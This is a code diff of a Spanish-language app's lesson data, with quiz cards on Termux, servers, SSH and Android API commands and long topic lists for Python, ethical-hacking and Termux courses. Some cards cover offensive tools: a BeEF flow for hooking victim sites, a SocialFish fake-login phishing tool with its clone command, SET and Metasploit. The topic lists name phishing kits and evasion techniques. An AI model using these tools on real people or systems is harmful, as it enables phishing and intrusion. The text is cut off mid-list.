-mk("getopts (parsear opciones)",[{t:"¿Qué hace?",c:"Procesa opciones tipo <code>-a</code>, <code>-b valor</code>."},{t:"Ejemplo",c:"<pre>while getopts \"n:e:\" opt; do\n    case $opt in\n        n) nombre=$OPTARG ;;\n        e) email=$OPTARG ;;\n        *) echo \"Uso: $0 -n nombre -e email\" ;;\n    esac\ndone\necho \"Nombre: $nombre\"</pre>"},{t:"Útil para",c:"Scripts que reciben argumentos de línea de comandos."}],"¿Qué hace?",["Opciones","Red","CPU","RAM"],0),
-mk("trap (capturar señales)",[{t:"¿Qué hace?",c:"Ejecuta código cuando el script recibe señales (Ctrl+C, salir, etc.)."},{t:"Ejemplo",c:"<pre>trap 'echo \"Limpiando...\"; rm -f /tmp/temp' EXIT\n\necho \"Trabajando...\"\nsleep 5</pre>"},{t:"Señales comunes",c:"• <code>EXIT</code>: al salir<br>• <code>INT</code>: Ctrl+C<br>• <code>TERM</code>: terminar"},{t:"Útil para",c:"Limpiar archivos temporales al salir."}],"¿Qué captura?",["Señales","Red","CPU","RAM"],0),
-mk("At (programar tareas)",[{t:"¿Qué hace?",c:"Ejecuta comandos una sola vez en un momento específico."},{t:"Instalar",c:"<code>pkg install at</code>"},{t:"Uso",c:"<pre>at 15:30\necho \"Recordatorio\" | at now + 10 minutes</pre>"},{t:"Ver cola",c:"<code>atq</code>"},{t:"Eliminar",c:"<code>atrm numero</code>"}],"¿Qué hace At?",["Programa","Borra","Red","CPU"],0),
-mk("Servicios en Termux",[{t:"terminado",c:"Permite correr servicios en segundo plano sin root."},{t:"Instalar",c:"<code>pkg install termux-services</code>"},{t:"Uso",c:"<code>sv-enable sshd</code> para que sshd arranque al inicio."},{t:"Listar",c:"<code>sv status sshd</code>"}],"¿Qué es terminado?",["Servicios","App","Red","CPU"],0),
-mk("SSH server en Termux",[{t:"Instalar",c:"<code>pkg install openssh</code>"},{t:"Iniciar",c:"<code>sshd</code>"},{t:"Ver usuario",c:"<code>whoami</code>"},{t:"Puerto",c:"Por defecto 8022 (no 22)."},{t:"Conectar desde PC",c:"<code>ssh -p 8022 usuario@ip-termux</code>"},{t:"Ver IP",c:"<code>ifconfig</code>"}],"¿Qué hace?",["Servidor SSH","Cliente","Red","CPU"],0),
-mk("SSH tunneling",[{t:"¿Qué es?",c:"Redirigir puertos a través de SSH."},{t:"Local (-L)",c:"<code>ssh -L 8080:localhost:80 user@server</code> redirige tu 8080 al 80 del server."},{t:"Remoto (-R)",c:"<code>ssh -R 9090:localhost:3000 user@server</code> expone tu 3000 en el server."},{t:"Dinámico (-D)",c:"Proxy SOCKS: <code>ssh -D 1080 user@server</code>"}],"¿Qué hace -L?",["Local","Remoto","Dinámico","Nada"],0),
-mk("SCP (copiar archivos)",[{t:"¿Qué es?",c:"Copia archivos entre máquinas por SSH."},{t:"Enviar",c:"<code>scp archivo.txt user@ip:/ruta/destino/</code>"},{t:"Recibir",c:"<code>scp user@ip:/ruta/archivo.txt .</code>"},{t:"Carpeta completa",c:"<code>scp -r carpeta/ user@ip:/destino/</code>"}],"¿Qué copia?",["Archivos","Red","CPU","RAM"],0),
-mk("Rsync (sincronizar)",[{t:"¿Qué es?",c:"Sincroniza archivos eficientemente entre máquinas."},{t:"Básico",c:"<code>rsync -av origen/ user@ip:/destino/</code>"},{t:"Solo cambios",c:"Rsync solo envía lo que cambió. Muy eficiente."},{t:"Eliminar en destino",c:"<code>rsync -av --delete origen/ destino/</code>"}],"¿Qué hace?",["Sincroniza","Borra","Red","CPU"],0),
-mk("FTP server en Termux",[{t:"Instalar",c:"<code>pip install pyftpdlib</code>"},{t:"Iniciar",c:"<code>python -m pyftpdlib -p 2121</code>"},{t:"Conectar",c:"Desde un cliente FTP a <code>ftp://tu-ip:2121</code>"},{t:"Usuario",c:"Por defecto es anónimo. Se puede configurar."}],"¿Qué sirve?",["FTP","HTTP","SSH","SMTP"],0),
-mk("HTTP server",[{t:"Python",c:"<code>python -m http.server 8000</code>"},{t:"Node",c:"<code>npx http-server -p 8000</code>"},{t:"PHP",c:"<code>php -S localhost:8000</code>"},{t:"Acceso",c:"<code>http://tu-ip:8000</code> desde otro dispositivo en la misma red."}],"¿Qué sirve?",["HTTP","FTP","SSH","SMTP"],0),
-mk("Nginx en Termux",[{t:"Instalar",c:"<code>pkg install nginx</code>"},{t:"Iniciar",c:"<code>nginx</code>"},{t:"Detener",c:"<code>nginx -s stop</code>"},{t:"Config",c:"Archivo en <code>$PREFIX/etc/nginx/nginx.conf</code>."},{t:"Puerto",c:"Por defecto 8080 en Termux."}],"¿Qué es Nginx?",["Web server","App","Red","CPU"],0),
-mk("Apache en Termux",[{t:"Instalar",c:"<code>pkg install apache2</code>"},{t:"Iniciar",c:"<code>apachectl start</code>"},{t:"Detener",c:"<code>apachectl stop</code>"},{t:"Config",c:"En <code>$PREFIX/etc/apache2/httpd.conf</code>."}],"¿Qué es Apache?",["Web server","App","Red","CPU"],0),
-mk("MariaDB (MySQL)",[{t:"Instalar",c:"<code>pkg install mariadb</code>"},{t:"Iniciar",c:"<code>mysqld_safe &</code>"},{t:"Conectar",c:"<code>mysql -u root</code>"},{t:"Crear DB",c:"<code>CREATE DATABASE prueba;</code>"}],"¿Qué es?",["Database","App","Red","CPU"],0),
-mk("PostgreSQL",[{t:"Instalar",c:"<code>pkg install postgresql</code>"},{t:"Iniciar",c:"<code>pg_ctl -D $PREFIX/var/lib/postgresql start</code>"},{t:"Conectar",c:"<code>psql -U postgres</code>"},{t:"Crear DB",c:"<code>CREATE DATABASE prueba;</code>"}],"¿Qué es?",["Database","App","Red","CPU"],0),
-mk("Redis",[{t:"Instalar",c:"<code>pkg install redis</code>"},{t:"Iniciar",c:"<code>redis-server</code>"},{t:"Conectar",c:"<code>redis-cli</code>"},{t:"Uso",c:"Cache en memoria. Muy rápido para sesiones o colas."}],"¿Qué es?",["Cache","DB","App","Red"],0),
-mk("MongoDB",[{t:"Instalar",c:"Requiere proot (no está en repos de Termux)."},{t:"Alternativa",c:"Usar <code>proot-distro</code> con Ubuntu."},{t:"Uso",c:"Base de datos NoSQL orientada a documentos."},{t:"Cliente",c:"<code>mongosh</code> para conectar."}],"¿Qué es?",["NoSQL DB","App","Red","CPU"],0),
-mk("SQLite CLI",[{t:"Instalar",c:"<code>pkg install sqlite</code>"},{t:"Crear DB",c:"<code>sqlite3 prueba.db</code>"},{t:"Comandos",c:"<pre>.tables\nCREATE TABLE users (id INTEGER, name TEXT);\nINSERT INTO users VALUES (1, 'Ana');\nSELECT * FROM users;</pre>"},{t:"Salir",c:"<code>.quit</code>"}],"¿Qué es?",["DB CLI","App","Red","CPU"],0),
-mk("Git avanzado",[{t:"Ramas",c:"<code>git branch nueva</code> y <code>git checkout nueva</code>"},{t:"Merge",c:"<code>git merge otra-rama</code>"},{t:"Rebase",c:"<code>git rebase main</code> reescribe historia."},{t:"Stash",c:"<code>git stash</code> guarda cambios temporales."},{t:"Log",c:"<code>git log --oneline --graph</code>"}],"¿Qué hace rebase?",["Reescribe","Borra","Red","CPU"],0),
-mk("GitHub CLI (gh)",[{t:"Instalar",c:"<code>pkg install gh</code>"},{t:"Login",c:"<code>gh auth login</code>"},{t:"Crear repo",c:"<code>gh repo create mi-proyecto</code>"},{t:"Ver PRs",c:"<code>gh pr list</code>"}],"¿Qué es gh?",["CLI GitHub","App","Red","CPU"],0),
-mk("SSH keys",[{t:"Generar",c:"<code>ssh-keygen -t ed25519 -C \"email\"</code>"},{t:"Ver pública",c:"<code>cat ~/.ssh/id_ed25519.pub</code>"},{t:"Copiar a server",c:"<code>ssh-copy-id user@ip</code>"},{t:"Usar con GitHub",c:"Pega la pública en Settings → SSH keys."}],"¿Qué genera?",["Claves","App","Red","CPU"],0),
-mk("GPG (cifrado)",[{t:"¿Qué es?",c:"GNU Privacy Guard. Cifra archivos y comunicaciones."},{t:"Generar clave",c:"<code>gpg --full-generate-key</code>"},{t:"Cifrar",c:"<code>gpg -c archivo.txt</code> (con contraseña)"},{t:"Descifrar",c:"<code>gpg -d archivo.txt.gpg</code>"}],"¿Qué hace?",["Cifrado","Borra","Red","CPU"],0),
-mk("Proot (distros Linux)",[{t:"¿Qué es?",c:"Ejecuta distros Linux completas sin root."},{t:"Instalar",c:"<code>pkg install proot-distro</code>"},{t:"Instalar Ubuntu",c:"<code>proot-distro install ubuntu</code>"},{t:"Entrar",c:"<code>proot-distro login ubuntu</code>"},{t:"Distros disponibles",c:"<code>proot-distro list</code>"}],"¿Qué hace?",["Distros Linux","App","Red","CPU"],0),
-mk("Ubuntu en Termux",[{t:"Instalar",c:"<code>proot-distro install ubuntu</code>"},{t:"Entrar",c:"<code>proot-distro login ubuntu</code>"},{t:"Actualizar",c:"Dentro: <code>apt update && apt upgrade</code>"},{t:"Instalar paquetes",c:"<code>apt install htop</code>"}],"¿Qué instala?",["Ubuntu","Kali","Arch","Fedora"],0),
-mk("Kali en Termux",[{t:"Instalar",c:"<code>proot-distro install kali</code>"},{t:"Entrar",c:"<code>proot-distro login kali</code>"},{t:"Ventaja",c:"Todas las herramientas de pentesting en tu celular."},{t:"Nota",c:"Consume más recursos que Termux puro."}],"¿Qué instala?",["Kali","Ubuntu","Arch","Fedora"],0),
-mk("X11 VNC",[{t:"¿Qué es?",c:"Interfaz gráfica para Termux. Muestra ventanas reales."},{t:"Instalar",c:"<code>pkg install x11-repo tigervnc</code>"},{t:"Iniciar",c:"<code>vncserver</code>"},{t:"Cliente",c:"Usa VNC Viewer en Android para conectar a localhost:5901."},{t:"Nota",c:"Requiere también la app Termux:X11."}],"¿Qué hace VNC?",["GUI remota","Borra","Red","CPU"],0),
-mk("XFCE (escritorio)",[{t:"¿Qué es?",c:"Entorno de escritorio ligero para Linux."},{t:"Instalar",c:"<code>pkg install xfce4</code> (necesita x11-repo)."},{t:"Iniciar",c:"<code>startxfce4</code> dentro de VNC."},{t:"Uso",c:"Tener un escritorio completo en el celular."}],"¿Qué es?",["Desktop","App","Red","CPU"],0),
-mk("Navegador en Termux",[{t:"Firefox",c:"<code>pkg install firefox</code> (necesita X11)."},{t:"Chromium",c:"<code>pkg install chromium</code>"},{t:"Nota",c:"Requiere VNC o Termux:X11 corriendo."},{t:"Alternativa",c:"Usar Chrome de Android directamente."}],"¿Qué puedes instalar?",["Firefox","Chrome","Edge","Safari"],0),
-mk("Termux:X11 (GUI)",[{t:"¿Qué es?",c:"App aparte que permite mostrar GUI de Termux en Android."},{t:"Instalar",c:"Desde F-Droid: Termux:X11."},{t:"Uso",c:"Abre Termux:X11 y ejecuta aplicaciones gráficas."},{t:"Ventaja",c:"Más fluido que VNC para uso local."}],"¿Qué hace?",["GUI","Borra","Red","CPU"],0),
-mk("Termux:API (app)",[{t:"¿Qué es?",c:"App complementaria para acceder a hardware."},{t:"Instalar",c:"F-Droid: Termux:API + <code>pkg install termux-api</code>"},{t:"Da acceso a",c:"Cámara, SMS, GPS, sensores, notificaciones, portapapeles..."},{t:"Requiere",c:"Permisos individuales del sistema."}],"¿Qué permite?",["Hardware","Red","CPU","RAM"],0),
-mk("SMS API",[{t:"Listar SMS",c:"<code>termux-sms-list</code>"},{t:"Enviar SMS",c:"<code>termux-sms-send -n 3001234567 \"Hola\"</code>"},{t:"Requiere",c:"Permiso de SMS concedido."}],"¿Qué hace?",["Envía SMS","Borra","Red","CPU"],0),
-mk("GPS (ubicación)",[{t:"Comando",c:"<code>termux-location</code>"},{t:"Salida",c:"JSON con latitud, longitud, altitud, velocidad."},{t:"Modos",c:"<code>-p gps</code>, <code>-p network</code>, <code>-p passive</code>"},{t:"Requiere",c:"Permiso de ubicación."}],"¿Qué da?",["Ubicación","Red","CPU","RAM"],0),
-mk("Cámara",[{t:"Foto",c:"<code>termux-camera-photo foto.jpg</code>"},{t:"Cámara frontal",c:"<code>termux-camera-photo -c 1 foto.jpg</code>"},{t:"Listar cámaras",c:"<code>termux-camera-info</code>"},{t:"Requiere",c:"Permiso de cámara."}],"¿Qué hace?",["Foto","Video","Borra","Red"],0),
-mk("Sensores",[{t:"Listar",c:"<code>termux-sensor -l</code>"},{t:"Leer uno",c:"<code>termux-sensor -s ACCELEROMETER -n 1</code>"},{t:"Tipos",c:"Acelerómetro, giroscopio, luz, proximidad, magnetómetro."}],"¿Qué da?",["Sensores","Red","CPU","RAM"],0),
-mk("Notificaciones",[{t:"Enviar",c:"<code>termux-notification -t \"Título\" -c \"Mensaje\"</code>"},{t:"Con acción",c:"<code>termux-notification --action \"echo hola\"</code>"},{t:"Eliminar",c:"<code>termux-notification-remove id</code>"}],"¿Qué hace?",["Notifica","Borra","Red","CPU"],0),
-mk("Clipboard",[{t:"Leer",c:"<code>termux-clipboard-get</code>"},{t:"Escribir",c:"<code>echo \"texto\" | termux-clipboard-set</code>"},{t:"Útil para",c:"Automatizar pegado de datos."}],"¿Qué hace?",["Clipboard","Red","CPU","RAM"],0),
-mk("TTS (text-to-speech)",[{t:"Hablar",c:"<code>termux-tts-speak \"Hola mundo\"</code>"},{t:"Idioma",c:"<code>termux-tts-speak -l es \"Hola\"</code>"},{t:"Requisito",c:"Motor TTS instalado en Android."}],"¿Qué hace?",["Habla","Borra","Red","CPU"],0),
-mk("Speech to text",[{t:"Escuchar",c:"<code>termux-speech-to-text</code>"},{t:"Salida",c:"Texto de lo que dijiste."},{t:"Útil para",c:"Dictado por voz."}],"¿Qué hace?",["Escucha","Borra","Red","CPU"],0),
-mk("Bluetooth",[{t:"Listar",c:"<code>termux-bluetooth-scan</code>"},{t:"Conectar",c:"<code>termux-bluetooth-connect MAC</code>"},{t:"Requiere",c:"Permisos de Bluetooth."}],"¿Qué controla?",["Bluetooth","WiFi","Red","CPU"],0),
-mk("WiFi info",[{t:"Info de conexión",c:"<code>termux-wifi-connectioninfo</code>"},{t:"Escanear redes",c:"<code>termux-wifi-scaninfo</code>"},{t:"Salida",c:"JSON con SSID, BSSID, IP, señal."},{t:"Requiere",c:"Permiso de ubicación para escanear."}],"¿Qué da?",["Info WiFi","Red","CPU","RAM"],0),
-mk("Telephony",[{t:"Info de red",c:"<code>termux-telephony-cellinfo</code>"},{t:"Info de dispositivo",c:"<code>termux-telephony-deviceinfo</code>"},{t:"Requiere",c:"Permisos de teléfono."}],"¿Qué controla?",["Teléfono","Red","CPU","RAM"],0),
-mk("Contactos",[{t:"Listar",c:"<code>termux-contact-list</code>"},{t:"Salida",c:"JSON con nombres y teléfonos."},{t:"Requiere",c:"Permiso de contactos."}],"¿Qué lista?",["Contactos","Red","CPU","RAM"],0),
-mk("iptables (firewall)",[{t:"¿Qué es?",c:"Filtra paquetes de red en Linux. Requiere root."},{t:"Listar reglas",c:"<code>iptables -L</code>"},{t:"Bloquear IP",c:"<code>iptables -A INPUT -s 1.2.3.4 -j DROP</code>"},{t:"Guardar reglas",c:"<code>iptables-save > reglas.txt</code>"}],"¿Qué hace?",["Firewall","App","Red","CPU"],0),
-mk("tcpdump avanzado",[{t:"Filtros BPF",c:"<code>tcpdump 'tcp port 80'</code>"},{t:"Escribir archivo",c:"<code>tcpdump -w cap.pcap -i wlan0</code>"},{t:"Leer archivo",c:"<code>tcpdump -r cap.pcap</code>"},{t:"Verbose",c:"<code>tcpdump -vvv</code>"}],"¿Qué filtra?",["Paquetes","Red","CPU","RAM"],0),
-mk("tshark (Wireshark CLI)",[{t:"¿Qué es?",c:"Versión de línea de comandos de Wireshark."},{t:"Instalar",c:"<code>pkg install tshark</code>"},{t:"Capturar",c:"<code>tshark -i wlan0</code>"},{t:"Filtros",c:"<code>tshark -Y \"http.request\"</code>"}],"¿Qué es?",["Sniffer CLI","App","Red","CPU"],0),
-mk("Nmap scripts (NSE)",[{t:"¿Qué son?",c:"Scripts que extienden Nmap para detectar vulnerabilidades."},{t:"Categorías",c:"auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln"},{t:"Ejemplo",c:"<code>nmap --script vuln 192.168.1.1</code>"},{t:"Script específico",c:"<code>nmap --script http-title 192.168.1.1</code>"}],"¿Qué corre?",["Scripts NSE","Red","CPU","RAM"],0),
-mk("Metasploit Termux (proot)",[{t:"Recomendación",c:"Usar proot con Kali para mejor compatibilidad."},{t:"Instalar Kali",c:"<code>proot-distro install kali && proot-distro login kali</code>"},{t:"Dentro",c:"<code>apt update && apt install metasploit-framework</code>"},{t:"Iniciar",c:"<code>msfconsole</code>"}],"¿Qué instala?",["Metasploit","Nmap","Hydra","John"],0),
-mk("BeEF (Browser Exploitation)",[{t:"¿Qué es?",c:"Framework para explotar navegadores."},{t:"Requiere",c:"Ruby y servidor corriendo."},{t:"Flujo",c:"1. Iniciar BeEF<br>2. Inyectar hook en web víctima<br>3. Controlar navegadores conectados"},{t:"Uso ético",c:"Solo en laboratorios propios o pentesting autorizado."}],"¿Qué explota?",["Navegadores","Red","CPU","RAM"],0),
-mk("SET (Social Engineering Toolkit)",[{t:"¿Qué es?",c:"Toolkit para ataques de ingeniería social."},{t:"Incluye",c:"• Phishing<br>• Clonado de webs<br>• Payloads<br>• Ataques WiFi"},{t:"Instalar",c:"En Kali: <code>apt install set</code>"},{t:"Iniciar",c:"<code>setoolkit</code>"}],"¿Qué hace?",["Ing. social","Red","CPU","RAM"],0),
-mk("SocialFish",[{t:"¿Qué es?",c:"Herramienta de phishing para redes sociales."},{t:"Uso",c:"Crea páginas falsas de login de redes sociales."},{t:"Ética",c:"Solo con autorización. Es delito usarlo sin permiso."},{t:"Instalar",c:"<code>git clone https://github.com/UndeadSec/SocialFish</code>"}],"¿Qué hace?",["Phishing","Red","CPU","RAM"],0),
-mk("Bot de Telegram",[{t:"¿Qué es?",c:"Programa que responde a mensajes en Telegram."},{t:"Librería",c:"<code>pip install python-telegram-bot</code>"},{t:"Ejemplo",c:"<pre>from telegram.ext import Application, CommandHandler\n\nasync def start(update, ctx):\n    await update.message.reply_text(\"Hola!\")\n\napp = Application.builder().token(\"TOKEN\").build()\napp.add_handler(CommandHandler(\"start\", start))\napp.run_polling()</pre>"},{t:"Crear bot",c:"Habla con @BotFather en Telegram."}],"¿Qué haces?",["Bot","App","Red","CPU"],0),
-mk("API Flask",[{t:"¿Qué es Flask?",c:"Framework web minimalista de Python."},{t:"Instalar",c:"<code>pip install flask</code>"},{t:"Ejemplo",c:"<pre>from flask import Flask, jsonify\napp = Flask(__name__)\n\n@app.route('/api/saludo')\ndef saludo():\n    return jsonify({\"msg\": \"Hola\"})\n\napp.run(host='0.0.0.0', port=5000)</pre>"},{t:"Acceder",c:"<code>http://tu-ip:5000/api/saludo</code>"}],"¿Qué crea?",["API","Red","CPU","RAM"],0),
-mk("Deploy desde Termux",[{t:"Vercel",c:"Sube con git push y Vercel despliega automáticamente."},{t:"Ngrok",c:"<code>ngrok http 5000</code> expone tu servidor local."},{t:"GitHub Pages",c:"Solo estáticos, pero fácil."},{t:"Railway/Render",c:"Alternativas para backends Python."}],"¿Qué usa?",["Deploy","Red","CPU","RAM"],0),
-mk("Proyecto final Termux",[{t:"Objetivo",c:"Crear un toolkit personal de pentesting."},{t:"Estructura",c:"<pre>#!/bin/bash\ncase $1 in\n  scan) nmap -sV $2 ;;\n  web) gobuster dir -u http://$2 -w wordlist.txt ;;\n  sniff) tcpdump -i wlan0 -w cap.pcap ;;\n  *) echo \"Uso: $0 {scan|web|sniff} objetivo\" ;;\nesac</pre>"},{t:"Mejoras",c:"• Guardar resultados<br>• Menú interactivo<br>• Logs con fecha<br>• Enviar notificación al terminar"},{t:"¡Felicidades!",c:"Dominas Termux. Ahora puedes practicar hacking ético desde tu celular."}],"¿Qué automatizas?",["Todo","Solo scan","Solo brute","Nada"],0),
-];
+// 300 temas por curso
+const PY_TEMAS=["Introducción a Python","Instalar Python","Variables","Tipos de datos","Operadores aritméticos","Strings","Entrada del usuario","Conversión de tipos","Condicional if","if/else","elif","Operadores lógicos","Bucle while","Bucle for","range()","Listas","Métodos de listas","Tuplas","Sets","Diccionarios","Métodos de dict","Funciones","Parámetros y return","Scope","Módulos","Librería random","Try/except","Archivos","Clases y objetos","Herencia","Polimorfismo","List comprehension","Lambda","map/filter","Decoradores","Generadores","Regex","JSON","Errores comunes","Proyecto Calculadora","Slicing","Listas anidadas","Sort","Reverse","Copy vs deepcopy","enumerate","zip","*args","**kwargs","Closures","Recursión","Memoization","Context managers","CSV","Archivos binarios","os","sys","pathlib","shutil","datetime","time","math","Regex avanzado","Grupos regex","Threading","Multiprocessing","Async/Await","Requests HTTP","API REST","JSON API","BeautifulSoup","SQLite","SQL CRUD","ORM básico","Métodos especiales","Property","Static methods","Class methods","Herencia múltiple","Abstract","Dataclasses","Enum","Type hints","unittest","pytest","Logging","argparse","Virtualenv","pip avanzado","requirements.txt","PyPI","Profiling","Optimización","Flask API","Django","FastAPI","asyncio","typing","f-strings","unpacking","walrus","match","PEP8","Docstrings","Comentarios","Variables globales","Constantes","Números complejos","Decimal","Fractions","Operadores bit a bit","Walrus operator","asyncio avanzado","Threads vs Processes","Locks y Semáforos","Colas","Sockets","Servidor TCP","Cliente TCP","UDP","Correos SMTP","POP3/IMAP","Web scraping avanzado","Selenium","Playwright","Automatización de tareas","Python en producción","Empaquetado","PyInstaller","Cython","Numba","Perfiles de rendimiento","Testing avanzado","Mock","Fixtures","CI/CD con GitHub Actions","Docker con Python","Kubernetes básico","FastAPI avanzado","Pydantic","WebSockets","GraphQL","gRPC","OAuth2","JWT en Python","Encriptación","Hashing","Firmas digitales","Compresión","ZIP","tar","gzip","PDF con Python","Excel con Python","Word con Python","PowerPoint con Python","Email con Python","WhatsApp bot","Telegram bot","Discord bot","Twitter bot","Instagram bot","YouTube API","Spotify API","Google APIs","AWS boto3","Azure SDK","GCP SDK","Machine Learning con scikit","Deep Learning con TensorFlow","PyTorch","OpenCV","Pandas","NumPy","Matplotlib","Seaborn","Plotly","Streamlit","Jupyter","Colab","Kaggle","Data cleaning","Data analysis","Web APIs públicas","Scraping con requests","BeautifulSoup vs Selenium","Parsing XML","YAML","TOML","ConfigParser","Env vars","Secrets management","Logging avanzado","Debugging","PDB","Traceback","Warnings","Assertions","Doctests","Profiling con cProfile","Memory profiling","Optimización de loops","Caching con lru_cache","Generadores infinitos","Itertools","Functools","Collections","Datetime avanzado","Timezone","Localización","i18n","gettext","Regex complejo","Backreferences","Lookahead/Lookbehind","Regex performance","Subprocess","Signals","Multiprocessing pools","Async generators","Context managers avanzados","Decoradores con argumentos","Property setters","Metaclases","ABCs","Protocols","TypeVar","Generic types","Protocol","overload","Final","Literal","Union types","Optional","Any","Callable","Tuple types","Dict types","List types","Set types","Iterable","Iterator","Generator typing","NamedTuple","TypedDict","Pydantic models","Dataclasses avanzadas","Attrs","SQLAlchemy ORM","Alembic","Migraciones","PostgreSQL con psycopg2","MySQL con pymysql","MongoDB con pymongo","Redis con redis-py","Elasticsearch","Kafka","RabbitMQ","Celery","APScheduler","FastAPI con JWT","FastAPI con WebSockets","FastAPI middlewares","Django REST Framework","Django admin","Django signals","Django templates","Django ORM","Django migrations","Django testing","Django deployment","Flask blueprints","Flask SQLAlchemy","Flask migrations","Flask testing","Flask deployment","Gunicorn","uWSGI","Nginx con Python","Load balancing","Microservicios","Monolitos vs micros","Serverless","AWS Lambda","Vercel serverless","Netlify functions","Cloud Run","Heroku","Railway","Render","Fly.io","DigitalOcean","Proyectos finales","Portafolio","GitHub portfolio","LinkedIn developer","Entrevistas técnicas","Algoritmos","Estructuras de datos","Big O","LeetCode patterns","System design","Code review","Refactoring","Clean code","SOLID","Design patterns","Singleton","Factory","Observer","Strategy","Decorator pattern","Repository pattern","MVC","MVP","MVVM"];
+const HK_TEMAS=["¿Qué es hacking ético?","Tipos de hackers","Ética y legalidad","Recon pasivo","Recon activo","Google Dorking","OSINT","Whois y DNS","Nmap básico","Nmap avanzado","Enumeración","Gobuster","OWASP Top 10","SQL injection","SQLmap","XSS","CSRF","SSRF","Fuerza bruta","Hydra","John the Ripper","Hashcat","Ingeniería social","Phishing","Sniffing","Wireshark","MITM","ARP Spoofing","Cripto básica","Hashing","SSL/TLS","Firewalls","IDS/IPS","Metasploit","Payloads","Post-explotación","Reportes","Bug Bounty","Certificaciones","Proyecto Lab","DNS enum","Subdomain enum","Shodan","theHarvester","Maltego","Recon-ng","Banner grabbing","SNMP enum","SMB enum","FTP enum","SSH enum","HTTP enum","Directory busting","Vhost enum","Parameter fuzzing","WAF detection","SSL analysis","OpenVAS","Nikto","Nuclei","Burp Suite","OWASP ZAP","SQLi manual","SQLi blind","SQLi time","NoSQL injection","Command injection","LDAP injection","XXE","SSRF avanzado","XSS stored","XSS reflected","XSS DOM","Open redirect","File upload","Path traversal","IDOR","Auth bypass","JWT attacks","Session hijacking","Password reset","Race conditions","Business logic","API security","GraphQL","WebSocket","CORS misconfig","Security headers","CSP bypass","Clickjacking","Subdomain takeover","SSTI","Deserialization","Buffer overflow","Privesc Linux","Privesc Windows","Pivoting","Red team ops","Reporte final","OSCP","eJPT","Kali Linux intro","Linux básico","Permisos Linux","Usuarios y grupos","Cron jobs","Servicios","Systemd","Netcat","Socat","Metasploit msfvenom","Metasploit encoder","Meterpreter","Postgres","MySQL","SSH tunneling","Proxychains","Tor","VPN","Anonimato","OSINT avanzado","SOCMINT","GEOINT","HUMINT","IMINT","Rastreo de personas","Análisis de metadatos","Exiftool","FOCA","Recon-ng módulos","Spiderfoot","Maltego transforms","Shodan filters","Censys","BinaryEdge","ZoomEye","GreyNoise","Have I Been Pwned","Dehashed","IntelX","Breach data","Credential stuffing","Password spraying","Kerberoasting","ASREPRoasting","Golden ticket","Silver ticket","Pass the hash","Pass the ticket","DCSync","BloodHound","SharpHound","PowerView","AMSI bypass","AppLocker bypass","UAC bypass","AV evasion","Shellcode encoding","Obfuscation","Reflective DLL","Process injection","DLL hijacking","Persistence Windows","Persistence Linux","Rootkits","Bootkits","Firmware malware","Ransomware análisis","Reverse engineering","Ghidra","IDA Pro","x64dbg","Radare2","OllyDbg","Malware analysis","Sandbox evasion","PE analysis","ELF analysis","Mobile hacking","Android basics","APK analysis","Frida","Objection","iOS hacking","Frida iOS","Burp mobile","Web app hacking","API hacking","Microservices hacking","Cloud hacking","AWS pentesting","Azure pentesting","GCP pentesting","Kubernetes hacking","Docker hacking","CI/CD attacks","Supply chain","Dependency confusion","Typosquatting","Cryptojacking","Social engineering avanzado","Pretexting","Baiting","Tailgating","Vishing","Smishing","Physical pentesting","Lockpicking","RFID cloning","WiFi pentesting","Aircrack-ng","Wifite","Reaver","WPA3 attacks","Evil twin","Rogue AP","Bluetooth hacking","Bluesnarfing","Bluejacking","Zigbee","Z-Wave","RF hacking","Software Defined Radio","Hardware hacking","JTAG","UART","SPI","I2C","Firmware dump","IoT hacking","Router hacking","Camera hacking","Smart TV","SCADA/ICS","Modbus","DNP3","S7comm","Red team infrastructure","C2 frameworks","Cobalt Strike","Sliver","Mythic","Empire","Metasploit C2","Redirectors","Domain fronting","Living off the land","LOLBins","Atomic Red Team","MITRE ATT&CK","Threat hunting","SIEM","Splunk","ELK Stack","Wazuh","Suricata","Zeek","YARA rules","Sigma rules","Threat intel","STIX/TAXII","MISP","OpenCTI","Forensics","Disk forensics","Memory forensics","Volatility","Autopsy","Sleuth Kit","Timeline analysis","Log analysis","Network forensics","Malware triage","Incident response","NIST framework","ISO 27001","GDPR","PCI DSS","HIPAA","SOC 2","Compliance","Risk assessment","Vulnerability management","Patch management","Bug bounty avanzado","HackerOne tips","Bugcrowd tips","Reportes profesionales","CVSS scoring","PoC development","Exploit writing","Shellcode writing","ROP chains","ASLR bypass","DEP bypass","CFG bypass","Heap exploitation","Stack canaries","Fortify sources","Code review security","Threat modeling","STRIDE","DREAD","Pentest report writing","Client communication","Scoping","Rules of engagement","Legal contracts","Insurance","Ethics in practice"];
+const TX_TEMAS=["¿Qué es Termux?","Instalar Termux","Comandos básicos","ls y cd","pwd","mkdir","rm","cp y mv","cat","head y tail","less","nano","vim","pkg update","pkg upgrade","pkg install","pkg uninstall","pkg search","termux-setup-storage","Acceso a almacenamiento","Variables de entorno","PATH","Aliases","Bashrc","SSH cliente","ssh-keygen","ssh-copy-id","SSH server","sshd","scp","rsync","FTP server","HTTP server","Nginx","Apache","PHP","Python","pip","Node.js","npm","Go","Rust","Java","Ruby","Git","GitHub CLI","gh","git clone","git commit","git push","git pull","git branch","git merge","git rebase","git stash","git log","git diff","git reset","git cherry-pick","git bisect","git hooks","git submodules","git LFS","Nmap","Nmap flags","Nmap scripts","Metasploit","msfconsole","msfvenom","Hydra","Hashcat","John","SQLmap","Gobuster","Dirb","Nikto","WPScan","Burp alternativa","Proxydroid","Ngrok","Cloudflared","Tor","tcpdump","Wireshark","tshark","tshark filtros","Aircrack","Airmon-ng","Airodump-ng","Reaver","Wifite","Bettercap","Ettercap","ARP spoofing","DNS spoofing","SSL strip","MITM","BeEF","SET","SocialFish","Shellphish","Zphisher","HiddenEye","Blackeye","CamPhish","Seeker","IPGeo","Sherlock","theHarvester","Maltego","Recon-ng","Spiderfoot","whois","dig","nslookup","host","traceroute","ping","mtr","netstat","ss","iptables","ufw","firewall","fail2ban","ClamAV","rkhunter","chkrootkit","lynis","lynis audit","OpenVAS","Nessus","Nikto","Nuclei","Burp Suite","OWASP ZAP","Wapiti","Skipfish","W3af","Arachni","Grabber","Vega","Acunetix","AppScan","Netsparker","Sublist3r","Amass","Subfinder","Assetfinder","Findomain","DNSRecon","DNSenum","Fierce","Gobuster DNS","Massdns","Shuffledns","Puredns","AltDNS","DNSGen","SubBrute","Knockpy","SubDomainizer","SubOver","Subjack","Tko-subs","Aquatone","EyeWitness","HTTPx","Httprobe","Hakrawler","Gau","Waybackurls","Wayback Machine","Gospider","Hakcheck-url","Meg","GF 